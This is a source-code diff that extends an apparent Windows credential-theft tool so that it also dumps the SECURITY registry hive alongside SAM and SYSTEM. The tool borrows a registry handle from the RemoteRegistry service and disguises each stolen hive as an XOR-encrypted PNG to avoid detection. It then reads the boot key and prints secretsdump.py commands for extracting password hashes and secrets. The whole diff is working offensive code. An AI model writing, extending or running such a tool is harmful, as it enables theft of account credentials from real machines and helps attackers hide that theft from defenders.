@@ -60,8 +60,11 @@ static fn_NtQueryKey                pNtQueryKey;
 static fn_NtSaveKey                 pNtSaveKey;
 static fn_NtClose                   pNtClose;
 
-static const WCHAR SAM_PATH[]   = L"\\REGISTRY\\MACHINE\\SAM";
+static const WCHAR SAM_PATH[] = L"\\REGISTRY\\MACHINE\\SAM";
 static const ULONG SAM_PATH_LEN = 21;
+
+static const WCHAR SECURITY_PATH[] = L"\\REGISTRY\\MACHINE\\SECURITY";
+static const ULONG SECURITY_PATH_LEN = 26;
 
 static const BYTE PNG_SIG[8] = {
     0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
@@ -545,12 +548,18 @@ int wmain(int argc, wchar_t *argv[])
 
     LPCWSTR samOut = (argc > 1) ? argv[1] : L"sam.png";
     LPCWSTR sysOut = (argc > 2) ? argv[2] : L"system.png";
+    LPCWSTR secOut = (argc > 3) ? argv[3] : NULL;
+    BOOL secWanted = (secOut != NULL);
 
-    WCHAR samTmp[MAX_PATH], sysTmp[MAX_PATH];
+    WCHAR samTmp[MAX_PATH], sysTmp[MAX_PATH], secTmp[MAX_PATH];
     _snwprintf(samTmp, MAX_PATH, L"%ls.tmp", samOut);
     samTmp[MAX_PATH - 1] = L'\0';
     _snwprintf(sysTmp, MAX_PATH, L"%ls.tmp", sysOut);
     sysTmp[MAX_PATH - 1] = L'\0';
+    if (secWanted) {
+        _snwprintf(secTmp, MAX_PATH, L"%ls.tmp", secOut);
+        secTmp[MAX_PATH - 1] = L'\0';
+    }
 
     if (!InitNtApis()) {
         wprintf(L"[-] Failed to resolve ntdll exports\n");
@@ -573,7 +582,7 @@ int wmain(int argc, wchar_t *argv[])
     }
     wprintf(L"[+] Key type index: %u\n", keyType);
 
-    wprintf(L"\n══ SAM hive (KeyProxy via RemoteRegistry) ══\n");
+    wprintf(L"\n══ Remote hives (KeyProxy via RemoteRegistry) ══\n");
 
     DWORD origStart = 0;
     BOOL  svcReconf = FALSE, svcStarted = FALSE;
@@ -591,9 +600,10 @@ int wmain(int argc, wchar_t *argv[])
         wprintf(L"  [-] RegConnectRegistryW failed\n");
         return 1;
     }
-    HKEY hSamRemote = NULL;
+
+    HKEY hHiveRemote = NULL;
     if (RegOpenKeyExW(hRemote, L"SAM", 0,
-            KEY_READ, &hSamRemote) != ERROR_SUCCESS) {
+            KEY_READ, &hHiveRemote) != ERROR_SUCCESS) {
         wprintf(L"  [-] Remote SAM open failed\n");
         RegCloseKey(hRemote);
         return 1;
@@ -602,8 +612,20 @@ int wmain(int argc, wchar_t *argv[])
 
     BOOL samOk = StealAndSave(svcPid, SAM_PATH, SAM_PATH_LEN,
                               samTmp, keyType, L"SAM");
+    RegCloseKey(hHiveRemote);
 
-    RegCloseKey(hSamRemote);
+    BOOL secOk = FALSE;
+    if (secWanted) {
+        if (RegOpenKeyExW(hRemote, L"SECURITY", REG_OPTION_BACKUP_RESTORE,
+                KEY_READ, &hHiveRemote) == ERROR_SUCCESS) {
+            secOk = StealAndSave(svcPid, SECURITY_PATH, SECURITY_PATH_LEN,
+                                 secTmp, keyType, L"SECURITY");
+            RegCloseKey(hHiveRemote);
+        } else {
+            wprintf(L"  [-] Remote SECURITY open failed: %lu\n", GetLastError());
+        }
+    }
+
     RegCloseKey(hRemote);
 
     RestoreService(L"RemoteRegistry", origStart, svcReconf, svcStarted);
@@ -643,6 +665,12 @@ int wmain(int argc, wchar_t *argv[])
         sysOk = DisguiseAsImage(sysTmp, sysOut, sysKey);
         if (sysOk) WriteKeyFile(sysOut, sysKey);
     }
+    if (secWanted && secOk) {
+        BYTE secKey[XOR_KEY_SIZE];
+        GenXorKey(secKey);
+        secOk = DisguiseAsImage(secTmp, secOut, secKey);
+        if (secOk) WriteKeyFile(secOut, secKey);
+    }
 
     wprintf(L"\n══ Boot key ══\n");
     BYTE bootKey[16];
@@ -655,20 +683,25 @@ int wmain(int argc, wchar_t *argv[])
     wprintf(L"\n╔══════════════════════════════════════════════════╗\n");
     wprintf(L"║  SAM:    %-40ls║\n", samOk  ? L"SUCCESS" : L"FAILED");
     wprintf(L"║  SYSTEM: %-40ls║\n", sysOk  ? L"SUCCESS" : L"FAILED");
+    if (secWanted)
+        wprintf(L"║  SECURITY: %-38ls║\n", secOk ? L"SUCCESS" : L"FAILED");
     wprintf(L"║  Format: PNG (XOR-encrypted, no regf on disk)   ║\n");
     wprintf(L"╚══════════════════════════════════════════════════╝\n");
 
-    if (samOk || sysOk) {
+    if (samOk || sysOk || (secWanted && secOk)) {
         wprintf(L"\n  Decode (keys saved alongside outputs):\n");
         if (samOk)
             wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", samOut, samOut);
         if (sysOk)
             wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", sysOut, sysOut);
-        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv LOCAL\n\n");
+        if (secWanted && secOk)
+            wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", secOut, secOut);
+        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n\n");
     }
 
     DeleteFileW(samTmp);
     DeleteFileW(sysTmp);
+    DeleteFileW(secTmp);
 
-    return (samOk && sysOk) ? 0 : 1;
+    return (samOk && sysOk && (!secWanted || secOk)) ? 0 : 1;
 }
